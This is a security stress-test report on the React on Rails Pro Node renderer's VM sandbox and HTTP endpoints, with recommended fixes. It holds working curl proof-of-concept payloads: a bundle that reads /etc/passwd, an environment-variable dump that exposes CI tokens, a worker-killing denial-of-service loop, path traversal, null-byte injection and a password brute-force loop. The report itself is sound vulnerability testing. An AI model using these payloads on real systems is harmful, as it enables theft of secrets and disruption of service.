# Node Renderer Stress Test Report

**Date:** 2026-04-22
**Renderer Version:** 16.5.1
**Protocol Version:** 2.0.0
**Node Version:** v20.19.5
**Renderer Location:** `packages/react-on-rails-pro-node-renderer/src/`
**Test Target:** http://localhost:3800 (dummy app renderer, 11 workers)

---

## Summary

Found **10 confirmed bugs** (3 critical security, 4 medium security, 3 low). The renderer is functionally
solid under concurrent load but has significant security gaps in its VM sandbox, information disclosure
in error responses, and missing protections against brute-force and DoS attacks.

---

## CRITICAL Bugs

### BUG-1: Arbitrary File Read via Uploaded Bundle (supportModules: true)

**Severity:** CRITICAL
**File:** `src/worker/vm.ts`, `src/shared/configBuilder.ts`

When `supportModules: true`, the VM context provides `require()` to bundle code. A malicious
bundle can read arbitrary files from the server filesystem.

```bash
# Create malicious bundle
echo 'var fs = require("fs"); global.RESULT = fs.readFileSync("/etc/passwd", "utf8");' > /tmp/fsread-bundle.js

# Upload and render
curl -s --http2-prior-knowledge -X POST "http://localhost:3800/bundles/fsreadbundle1/render/d1" \
  -F "password=myPassword1" \
  -F "protocolVersion=2.0.0" \
  -F "renderingRequest=RESULT" \
  -F "bundle=@/tmp/fsread-bundle.js"
```

**Response:** Full contents of `/etc/passwd` returned with HTTP 200.

**Impact:** Any authenticated user can read any file the Node process has access to.
This includes application secrets, database configs, SSH keys, etc.

---

### BUG-2: Full Environment Variable Dump via renderingRequest

**Severity:** CRITICAL
**File:** `src/worker/vm.ts`

When `supportModules: true`, the `process` object is injected into the VM context.
The `renderingRequest` field is evaluated as JavaScript and can access `process.env`.

```bash
curl -s --http2-prior-knowledge -X POST http://localhost:3800/bundles/validbundle123/render/d1 \
  -d "password=myPassword1&protocolVersion=2.0.0&renderingRequest=JSON.stringify(process.env)"
```

**Response:** Full dump of ALL environment variables including:
- `CIRCLE_CI_TOKEN` (CI secrets)
- `SSH_CONNECTION` (network topology)
- `GEM_HOME`, `GEM_PATH` (Ruby configuration)
- `HOME`, `USER`, `PATH` (system user details)
- `DBUS_SESSION_BUS_ADDRESS` (system internals)

**Impact:** Complete server environment exposure to any authenticated user.

---

### BUG-3: Worker Kill via process.exit() -- Denial of Service

**Severity:** CRITICAL
**File:** `src/worker/vm.ts`

The `process` object in the VM context allows `process.exit()`, which terminates the
worker process. An attacker can rapidly kill all workers.

```bash
# Kill a single worker
curl -s --http2-prior-knowledge -m 5 -X POST http://localhost:3800/bundles/validbundle123/render/d1 \
  -d "password=myPassword1&protocolVersion=2.0.0&renderingRequest=process.exit(1)"
# Response: HTTP 000 (connection dropped)

# Kill all workers rapidly (DoS)
for i in $(seq 1 20); do
  curl -s --http2-prior-knowledge -m 3 -X POST http://localhost:3800/bundles/validbundle123/render/d1 \
    -d "password=myPassword1&protocolVersion=2.0.0&renderingRequest=process.exit(1)" \
    -o /dev/null -w "%{http_code} " &
done
wait
# Result: 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000 000
```

**Impact:** All in-flight requests are dropped. The master process respawns workers, but there is
a service disruption window. An attacker can sustain this by sending continuous process.exit requests.

---

## MEDIUM Bugs

### BUG-4: Password Leaked in Protocol Version Error Response

**Severity:** MEDIUM
**File:** `src/worker/checkProtocolVersionHandler.ts` (line 51)

The protocol version check runs BEFORE authentication. When `protocolVersion` is missing,
the error response includes `JSON.stringify(body)`, which contains the password field.

```bash
curl -s --http2-prior-knowledge -X POST http://localhost:3800/bundles/t1/render/d1 \
  -d "password=myPassword1&renderingRequest=SENSITIVE_DATA_HERE"
```

**Response:**
```
Unsupported renderer protocol version MISSING with body
{"password":"myPassword1","renderingRequest":"SENSITIVE_DATA_HERE"}
does not match installed renderer protocol 2.0.0 for version 16.5.1.
```

**Impact:** While the password is the requester's own, the `renderingRequest` content
(which may contain sensitive component data) is also reflected. In a proxy-logging
environment, this could leak sensitive data into access logs.

**Fix:** Redact the body in the error message, or at minimum exclude the `password` field.
Also consider running auth BEFORE protocol checks.

---

### BUG-5: Path Traversal in /asset-exists Filename Parameter

**Severity:** MEDIUM
**File:** `src/shared/utils.ts` (getAssetPath function)

The `filename` query parameter is passed directly to `path.join()` without sanitization,
allowing path traversal to probe arbitrary file existence on the server.

```bash
curl -s --http2-prior-knowledge -X POST \
  "http://localhost:3800/asset-exists?filename=../../../../../../../../../etc/passwd" \
  -d "password=myPassword1&targetBundles=validbundle123"
```

**Response:**
```json
{"exists":true,"results":[{"bundleHash":"validbundle123","exists":true}]}
```

**Impact:** An authenticated attacker can determine whether arbitrary files exist on the
server filesystem. This enables reconnaissance for further attacks.

**Fix:** Apply `path.basename()` to the filename (like the file upload handler does) or
validate it contains no `..` segments.

---

### BUG-6: Null Byte Injection in bundleTimestamp Leaks Server Paths

**Severity:** MEDIUM
**File:** `src/worker/handleRenderRequest.ts`, `src/shared/utils.ts`

Null bytes in the `bundleTimestamp` URL parameter cause an unhandled error that includes
the full server filesystem path in the response.

```bash
curl -s --http2-prior-knowledge -X POST \
  "http://localhost:3800/bundles/test%00null/render/d1" \
  -d "password=myPassword1&protocolVersion=2.0.0&renderingRequest=test"
```

**Response (partial):**
```
EXCEPTION MESSAGE:
The argument 'path' must be a string without null bytes.
Received '/mnt/ssd/react_on_rails_v16.3/react_on_rails_pro/spec/dummy/
.node-renderer-bundles/test\x00null/test\x00null.js'
```

**Impact:** Reveals full server directory structure.

---

### BUG-7: No Rate Limiting on Authentication Failures

**Severity:** MEDIUM
**File:** `src/worker/authHandler.ts`, `src/worker.ts`

There is no rate limiting or account lockout on failed authentication attempts.
100 concurrent brute-force attempts all complete instantly.

```bash
for i in $(seq 1 100); do
  curl -s --http2-prior-knowledge -X POST http://localhost:3800/bundles/t1/render/d1 \
    -d "password=wrong${i}&protocolVersion=2.0.0&renderingRequest=test" \
    -o /dev/null -w "%{http_code} " &
done
wait
# Result: 401 401 401 401 ... (all 100 complete instantly, no blocking)
```

**Impact:** Enables password brute-forcing. The timing-safe comparison prevents timing
attacks, but unlimited attempts negate this protection.

---

## LOW Bugs

### BUG-8: /info Endpoint Exposes Server Details Without Authentication

**Severity:** LOW
**File:** `src/worker.ts` (line 547)

The `/info` endpoint returns node version and renderer version without any authentication.

```bash
curl -s --http2-prior-knowledge http://localhost:3800/info
```

**Response:**
```json
{"node_version":"v20.19.5","renderer_version":"16.5.1"}
```

**Impact:** Reveals infrastructure version information to unauthenticated users,
aiding targeted attacks against known vulnerabilities in specific versions.

---

### BUG-9: /asset-exists Skips Protocol Version Check

**Severity:** LOW
**File:** `src/worker.ts` (line 501)

The `/asset-exists` endpoint uses `authenticate()` directly instead of
`performRequestPrechecks()`, skipping the protocol version check.

```bash
curl -s --http2-prior-knowledge -X POST \
  "http://localhost:3800/asset-exists?filename=test.js" \
  -d "password=myPassword1&protocolVersion=99.0.0&targetBundles=validbundle123"
```

**Response:** HTTP 200 (protocol version 99.0.0 accepted)

**Impact:** Protocol version mismatch goes undetected on this endpoint, potentially
allowing incompatible clients to interact with it.

---

### BUG-10: NODE_ENV Default Breaks Development Version Check

**Severity:** LOW
**File:** `src/worker/checkProtocolVersionHandler.ts` (line 8)

```typescript
const NODE_ENV = process.env.NODE_ENV || 'production';
```

When `NODE_ENV` is not set, it defaults to `'production'`. The version mismatch check
uses `isProduction = railsEnv === 'production' || NODE_ENV === 'production'`, which means
the production code path (warn-only) is always taken, even when `railsEnv=development`.

```bash
# This should return 412 in development but returns 200
curl -s --http2-prior-knowledge -X POST http://localhost:3800/bundles/validbundle123/render/d1 \
  -d "password=myPassword1&protocolVersion=2.0.0&gemVersion=16.0.0&railsEnv=development&renderingRequest=ReactOnRails.serverRenderReactComponent({name:'Hello',props:{}})"
# HTTP 200 -- should be 412
```

**Impact:** Version mismatch errors are silently swallowed in development when NODE_ENV is
unset, allowing developers to unknowingly run mismatched versions.

---

## Error Responses Leak Internal Paths (Design Issue)

**File:** `src/shared/utils.ts` (formatExceptionMessage)

All error responses include full stack traces with internal file paths like:
```
/mnt/ssd/react_on_rails_v16.3/packages/react-on-rails-pro-node-renderer/lib/worker/vm.js:332:41
```

This is expected for development but should be suppressed or truncated in production.

---

## Tests That Passed (Working as Expected)

| Test | Result |
|------|--------|
| Auth with correct password | 200 (passes auth, proceeds to render) |
| Auth with wrong password | 401 "Wrong password" |
| Auth with no password | 401 "Wrong password" |
| Auth with empty password | 401 "Wrong password" |
| Auth via Authorization header | 401 (correctly rejected -- body auth only) |
| Timing-safe password comparison | Uses `crypto.timingSafeEqual` |
| Protocol version mismatch | 412 with clear error message |
| Missing protocol version | 412 with body dump |
| Bundle upload with auth | 200 |
| Path traversal in upload filename | Sanitized via `path.basename()` |
| Upload without auth | 401 |
| Upload without bundle files | 400 with clear error |
| Corrupt JS bundle | 400 with syntax error |
| Bundle that throws error | 400 with error message |
| 50 concurrent render requests | All 200, latency 12-121ms |
| 6 slow (3s) concurrent requests | All 200, completed in ~3s (parallel workers) |
| maxVMPoolSize enforcement | 410 when exceeded |
| HTTP/1.1 requests | Correctly rejected (HTTP/2 only) |
| Unsupported Content-Type | 415 from Fastify |
| Unicode in props | 200 (handled correctly) |
| Large file upload (50MB) | 200 |
| Worker respawn after crash | Master respawns within 1s |
| Graceful 404 for unknown routes | JSON error with route info |

---

## Recommendations (Priority Order)

1. **Restrict `process` access in VM context** -- Remove or proxy `process.env`, `process.exit`,
   `process.pid`. Consider a frozen proxy that only exposes safe properties.
2. **Restrict `require` in bundle VM** -- Whitelist allowed modules or remove filesystem access
   (`fs`, `child_process`, `net`, etc.).
3. **Add rate limiting** -- Use `@fastify/rate-limit` for auth failures (e.g., 10 attempts per
   minute per IP).
4. **Sanitize error responses in production** -- Strip file paths and stack traces when
   `NODE_ENV=production`.
5. **Sanitize `filename` in `/asset-exists`** -- Apply `path.basename()` like the upload handler.
6. **Sanitize `bundleTimestamp`** -- Reject null bytes and path traversal characters.
7. **Fix protocol check body dump** -- Redact sensitive fields from the error message.
8. **Use `performRequestPrechecks`** in `/asset-exists` for consistency.
9. **Fix `NODE_ENV` default** -- Use `undefined` instead of `'production'` as the fallback.
10. **Protect `/info`** -- Require authentication or remove version details.
